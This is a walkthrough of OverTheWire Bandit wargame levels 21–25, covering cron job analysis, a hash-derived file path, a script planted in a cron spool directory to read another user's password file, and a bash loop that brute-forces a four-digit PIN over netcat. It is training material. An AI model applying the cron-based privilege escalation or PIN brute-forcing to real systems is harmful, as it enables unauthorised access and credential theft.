# 🔐 OverTheWire Bandit - Levels 21–24

## 📌 Overview
Levels 21–24 focus on **cron job analysis**, **script manipulation**, and **brute force techniques**. These exercises demonstrate real-world scenarios like analyzing scheduled tasks, understanding system automation, creating custom scripts, and implementing basic brute force attacks against network services.

---

## 🧭 Level Highlights (21 → 24)

### Level 21 → 22
**Goal**: Analyze cron jobs to find automated password retrieval.

**Commands / approach**:
```bash
ssh bandit21@bandit.labs.overthewire.org -p 2220
ls -la /etc/cron.d
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

**Result**: Password found in temporary file.

**Why**: Demonstrates cron job analysis — understanding how scheduled tasks work and where they store output. In real environments, malicious cron jobs are common persistence mechanisms.

---

### Level 22 → 23
**Goal**: Reverse engineer a script that generates dynamic file paths using username hashing.

**Commands / approach**:
```bash
ssh bandit22@bandit.labs.overthewire.org -p 2220
ls -la /etc/cron.d
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
# Target hash: 8ca319486bfbbc3663ea0fbe81326349
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```

**Result**: Password retrieved from hash-based filename.

**Why**: Shows how to reverse engineer script logic and predict dynamic file paths. Understanding hash-based naming conventions is useful for forensic analysis.

---

### Level 23 → 24
**Goal**: Create and deploy a custom script that will be executed by a cron job.

**Commands / approach**:
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
ls -la /etc/cron.d
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mktemp -d
# Working directory: /tmp/tmp.mu1REKVutY
cd /tmp/tmp.mu1REKVutY
nano bandit24pw.sh
```

**Script content**:
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass.txt
```

**Execution**:
```bash
chmod +x bandit24pw.sh
# Copy script to /var/spool/bandit24/foo (as per cron job)
# Wait for cron execution
cat /tmp/bandit24_pass.txt
```

**Result**: Script executed successfully, password extracted.

**Why**: Teaches script deployment and understanding cron job execution contexts. This simulates how attackers might abuse automated systems for privilege escalation.

---

### Level 24 → 25
**Goal**: Implement a brute force attack against a network service requiring password + PIN combination.

**Commands / approach**:
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
nc localhost 30002  # Test the service
mkdir /tmp/yout
cd /tmp/yout
vim brute.sh
```

**Brute force script**:
```bash
#!/bin/bash
bandit24=<current_level_password>
for pin in {0000..9999}; do
    echo "$bandit24 $pin"
done | nc localhost 30002
```

**Execution**:
```bash
chmod 777 brute.sh
./brute.sh
# Wait for correct PIN to be found
```

**Result**: Correct PIN combination found through brute force.

**Why**: Demonstrates basic brute force techniques and network service interaction. Understanding how to automate credential testing is important for both offensive and defensive security.

---

## 🛠 Tools & Commands You Practiced
- **Cron analysis**: `ls /etc/cron.d`, `cat cronjob_*`
- **Hash generation**: `md5sum`, `cut`
- **File operations**: `mktemp -d`, `nano`, `chmod +x`
- **Network interaction**: `nc localhost port`
- **Bash scripting**: loops, variable assignment, piping
- **Brute force**: automated credential testing

## 🔎 Key Takeaways
- **Cron job enumeration** is a standard privilege escalation technique — always check `/etc/cron.d` and `/var/spool/cron`.
- **Script analysis** requires understanding the execution context and predicting output locations.
- **Custom script deployment** through automated systems can be used for both legitimate tasks and malicious persistence.
- **Brute force attacks** against network services require understanding the service protocol and implementing efficient automation.
- **Temporary directories** (`mktemp -d`) provide secure workspace for script development and testing.

**Reference**: https://overthewire.org/wargames/bandit/
